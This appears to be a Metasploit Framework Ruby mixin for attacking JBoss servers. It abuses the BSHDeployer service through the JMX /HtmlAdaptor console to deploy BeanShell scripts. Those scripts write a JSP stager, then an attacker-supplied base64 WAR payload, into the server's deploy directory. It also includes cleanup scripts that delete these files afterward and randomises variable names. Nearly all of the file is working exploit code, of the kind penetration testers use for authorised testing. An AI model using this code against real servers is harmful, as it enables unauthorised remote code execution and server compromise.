# -*- coding: binary -*-
module Msf::HTTP::JBoss::BSH

  def initialize(info = {})
    super
    register_options(
      [
        Msf::OptString.new('PACKAGE',   [ false,  'The package containing the BSHDeployer service', 'auto' ])
      ], self.class)
  end
  
  def deploy_bsh(bsh_script)
    if datastore['PACKAGE'] == 'auto'
      packages = %w{ deployer scripts }
    else
      packages = [ datastore['PACKAGE'] ]
    end

    success = false
    packages.each do |p|
      print_status("Attempting to use '#{p}' as package")
      res = invoke_bshscript(bsh_script, p)
      if !res
        print_warning("Unable to deploy WAR [No Response]")
      end

      if (res.code < 200 || res.code >= 300)
        case res.code
          when 401
            print_warning("Warning: The web site asked for authentication: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}")
        end

        print_error("Unable to deploy BSH script [#{res.code} #{res.message}]")
      else
        success = true
        @pkg = p
        break
      end
    end
    return success
  end

  def gen_stager_bsh(app_base, stager_base, stager_jsp_name, content_var)
    # The following jsp script will write the exploded WAR file to the deploy/
    # directory. This is used to bypass the size limit for GET/HEAD requests
    # Dynamic variables, only used if we need a stager
    decoded_var = Rex::Text.rand_text_alpha(8+rand(8))
    file_path_var = Rex::Text.rand_text_alpha(8+rand(8))
    jboss_home_var = Rex::Text.rand_text_alpha(8+rand(8))
    fos_var = Rex::Text.rand_text_alpha(8+rand(8))
    stager_jsp = <<-EOT
<%@page import="java.io.*,
    java.util.*,
    sun.misc.BASE64Decoder"
%>
<%
  if (request.getParameter("#{content_var}") != null) {
    String #{jboss_home_var} = System.getProperty("jboss.server.home.dir");
    String #{file_path_var} = #{jboss_home_var} + "/deploy/" + "#{app_base}.war";
    try {
      String #{content_var} = "";
      #{content_var} = request.getParameter("#{content_var}");
      FileOutputStream #{fos_var} = new FileOutputStream(#{file_path_var});
      byte[] #{decoded_var} = new BASE64Decoder().decodeBuffer(#{content_var});
      #{fos_var}.write(#{decoded_var});
      #{fos_var}.close();
    }
    catch(Exception e){ }
  }
%>
EOT
    encoded_stager_code = Rex::Text.encode_base64(stager_jsp).gsub(/\n/, '')

    jsp_file_var = Rex::Text.rand_text_alpha(8+rand(8))
    fstream_var = Rex::Text.rand_text_alpha(8+rand(8))
    byteval_var = Rex::Text.rand_text_alpha(8+rand(8))
    stager_var = Rex::Text.rand_text_alpha(8+rand(8))
    decoder_var = Rex::Text.rand_text_alpha(8+rand(8))

    # The following Beanshell script will write a short stager application into the deploy
    # directory. This stager script is then used to install the payload
    #
    # This is neccessary to overcome the size limit for GET/HEAD requests
    stager_bsh_script = <<-EOT
import java.io.FileOutputStream;
import sun.misc.BASE64Decoder;

String #{stager_var} = "#{encoded_stager_code}";

BASE64Decoder #{decoder_var} = new BASE64Decoder();
String #{jboss_home_var} = System.getProperty("jboss.server.home.dir");
new File(#{jboss_home_var} + "/deploy/#{stager_base + '.war'}").mkdir();
byte[] #{byteval_var} = #{decoder_var}.decodeBuffer(#{stager_var});
String #{jsp_file_var} = #{jboss_home_var} + "/deploy/#{stager_base + '.war/' + stager_jsp_name + '.jsp'}";
FileOutputStream #{fstream_var} = new FileOutputStream(#{jsp_file_var});
#{fstream_var}.write(#{byteval_var});
#{fstream_var}.close();
EOT
    print_status("Creating exploded WAR in deploy/#{stager_base}.war/ dir via BSHDeployer")
    return stager_bsh_script 
  end

  def gen_payload_bsh(encoded_payload, app_base)

    # The following Beanshell script will write the exploded WAR file to the deploy/
    # directory
    payload_bsh_script = <<-EOT
import java.io.FileOutputStream;
import sun.misc.BASE64Decoder;

String val = "#{encoded_payload}";

BASE64Decoder decoder = new BASE64Decoder();
String jboss_home = System.getProperty("jboss.server.home.dir");
byte[] byteval = decoder.decodeBuffer(val);
String war_file = jboss_home + "/deploy/#{app_base + '.war'}";
FileOutputStream fstream = new FileOutputStream(war_file);
fstream.write(byteval);
fstream.close();
EOT

    print_status("Creating exploded WAR in deploy/#{app_base}.war/ dir via BSHDeployer")
    return payload_bsh_script  
  end

  # Invokes +bsh_script+ on the JBoss AS via BSHDeployer
  def invoke_bshscript(bsh_script, pkg)
    params =  'action=invokeOpByName'
    params << '&name=jboss.' + pkg + ':service=BSHDeployer'
    params << '&methodName=createScriptDeployment'
    params << '&argType=java.lang.String'
    params << '&arg0=' + Rex::Text.uri_encode(bsh_script)
    params << '&argType=java.lang.String'
    params << '&arg1=' + Rex::Text.rand_text_alphanumeric(8+rand(8)) + '.bsh'

    if (datastore['VERB']== "POST")
      res = send_request_cgi({
        'method'	=> datastore['VERB'],
        'uri'			=> normalize_uri(datastore['TARGETURI'], '/HtmlAdaptor'),
        'data'		=> params
      })
    else
      res = send_request_cgi({
        'method'	=> datastore['VERB'],
        'uri'			=> normalize_uri(datastore['TARGETURI'], '/HtmlAdaptor') + "?#{params}"
      }, 30)
    end
    res
  end
	
	def get_undeploy_stager(app_base, stager_base, stager_jsp_name)
    delete_stager_script = <<-EOT
String jboss_home = System.getProperty("jboss.server.home.dir");
new File(jboss_home + "/deploy/#{stager_base + '.war/' + stager_jsp_name + '.jsp'}").delete();
new File(jboss_home + "/deploy/#{stager_base + '.war'}").delete();
new File(jboss_home + "/deploy/#{app_base + '.war'}").delete();
EOT

    delete_stager_script
	end
	def get_undeploy_bsh(app_base)
    delete_script = <<-EOT
String jboss_home = System.getProperty("jboss.server.home.dir");
new File(jboss_home + "/deploy/#{app_base + '.war'}").delete();
EOT
		delete_script
	end
end
